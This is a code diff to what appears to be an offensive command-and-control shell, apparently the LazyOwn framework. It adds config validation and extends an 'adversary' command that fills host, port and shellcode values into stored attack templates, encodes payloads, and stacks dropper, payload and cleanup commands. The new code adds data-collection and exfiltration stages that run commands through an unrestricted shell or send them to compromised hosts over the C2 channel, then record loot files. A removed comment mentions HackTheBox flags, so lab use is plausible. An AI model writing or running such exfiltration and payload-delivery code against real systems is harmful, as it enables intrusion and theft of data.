@@ -79,16 +79,37 @@ from cli.show import format_payload as _format_payload
 from cli.status_bar import build_default_manager as _build_status_bar_manager
 from cli.toast_bus import render_toasts as _render_toasts
 from cli.wizard import run as _run_wizard
-from core.config import load_payload as _load_payload, save_payload as _save_payload
-from utils import *  # TODO: migrate to explicit imports (see pyproject.toml F405)
-
-
-
+from core.config import load_and_validate as _load_and_validate, load_payload as _load_payload, save_payload as _save_payload
+from modules.db import LazyOwnDB as _LazyOwnDB
+from modules.llm_factory import try_get_llm_backend as _try_get_llm_backend
+from modules.metrics import get_recorder as _get_metrics_recorder
+from modules.module_registry import ModuleRegistry as _ModuleRegistry
+from modules.module_registry import format_module_detail as _format_module_detail
+from modules.module_registry import format_module_table as _format_module_table
+from modules.payload_factory import PayloadFactory as _PayloadFactory
+from modules.payload_factory import format_payload_table as _format_payload_table
+from skills.unified_orchestrator import build_default_orchestrator as _build_unified_orchestrator
+from utils import *
 
 _PALETTE_RENDER_CONFIG = _PaletteRenderConfig()
 _PALETTE_COMPLETER = _PaletteCompleter(_PALETTE_RENDER_CONFIG)
 
 config = _load_payload()
+
+try:
+    _validated, _issues = _load_and_validate()
+    _errs = [i for i in _issues if getattr(i, "severity", None) and str(i.severity) == "error"]
+    _warns = [i for i in _issues if getattr(i, "severity", None) and str(i.severity) == "warning"]
+    if _errs:
+        import sys as _sys
+        for _e in _errs:
+            _sys.stderr.write(f"[payload] ERROR: {_e.key}: {_e.message}\n")
+    if _warns:
+        import sys as _sys
+        for _w in _warns:
+            _sys.stderr.write(f"[payload] WARNING: {_w.key}: {_w.message}\n")
+except Exception:
+    pass
 aes_key = config.get("aes_key")
 api_key = config.get("api_key")
 route_maleable = config.get("c2_maleable_route")
@@ -22902,7 +22923,6 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
             None
         """
-        # TODO: implement the data-upload stage and the exfiltration stage (for example HackTheBox flags).
         self.params["c2_port"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -22923,11 +22943,11 @@ class LazyOwnShell(cmd2.Cmd):
 
             id_adversary = input("    [!] Enter the id of the adversary: ")
         else:
-            if len(line) == 3:
-                args = line.split(" ")
+            args = line.split()
+            if len(args) >= 2:
                 id_adversary = args[0]
-                confirm = args[1]
-            elif len(line) == 1:
+                confirm = args[1] if len(args) > 1 else None
+            elif len(args) == 1:
                 confirm = None
                 id_adversary = line.strip()
 
@@ -22943,7 +22963,9 @@ class LazyOwnShell(cmd2.Cmd):
                 "pid": adversary.pid,
                 "param": adversary.param,
                 "shellcode": adversary.shellcode,
-                "lhost": lhost
+                "lhost": lhost,
+                "lport": str(lport),
+                "rhost": str(self.params.get("rhost", "")),
             }
             command = replace_placeholders(adversary.command, replacements)
             if adversary.encoder == "base64":
@@ -22963,6 +22985,13 @@ class LazyOwnShell(cmd2.Cmd):
             copy_command = replace_placeholders(adversary.copy_command, replacements)
             replace_command = replace_placeholders(adversary.replace_command, replacements)
             replace_command = replace_command.replace("[shellcode]","{shellcode}")
+
+            exfil_data = getattr(adversary, 'exfil_data', '')
+            exfil_upload = getattr(adversary, 'exfil_upload', '')
+            if exfil_data:
+                exfil_data = replace_placeholders(exfil_data, replacements)
+            if exfil_upload:
+                exfil_upload = replace_placeholders(exfil_upload, replacements)
 
             if adversary.id == 5:
                 print_warn(f"{path}/{adversary.output_path}/{adversary.name}")
@@ -22987,6 +23016,10 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Encoded Command: {base64_command}")
             print_msg(f"Payload Command: {payload}")
             print_msg(f"Clean Command: {clean_cmd}")
+            if exfil_data:
+                print_msg(f"Exfil Data Command: {exfil_data}")
+            if exfil_upload:
+                print_msg(f"Exfil Upload Command: {exfil_upload}")
 
             local_stack = [copy_command, replace_command, compile_command]
             remote_stack = [droper_command, payload, clean_cmd]
@@ -23026,6 +23059,27 @@ class LazyOwnShell(cmd2.Cmd):
                     command_clipboard.communicate(input=command.encode())
                     print_msg(f"Command copied to clipboard: {command}")
                 time.sleep(int(adversary.sleep))
+
+            if exfil_data and confirm in ('l', 'r'):
+                time.sleep(int(adversary.sleep))
+                print_succ("=== DATA COLLECTION STAGE ===")
+                print_warn(f"Collecting data: {exfil_data}")
+                if confirm == 'l':
+                    subprocess.run(exfil_data + " 2>/dev/null", shell=True)
+                elif confirm == 'r':
+                    self.issue_command_to_c2(exfil_data, user)
+                time.sleep(int(adversary.sleep))
+
+            if exfil_upload and confirm in ('l', 'r'):
+                print_succ("=== EXFILTRATION STAGE ===")
+                print_warn(f"Exfiltrating data: {exfil_upload}")
+                if confirm == 'l':
+                    subprocess.run(exfil_upload + " 2>/dev/null", shell=True)
+                elif confirm == 'r':
+                    self.issue_command_to_c2(exfil_upload, user)
+                time.sleep(int(adversary.sleep))
+                exfil_output = f"{path}/sessions/loot_{adversary.name}_{int(time.time())}.txt"
+                print_succ(f"Exfiltration complete. Check loot at: {exfil_output}")
         else:
             print_warn(f"No adversary found with id {line}")
 
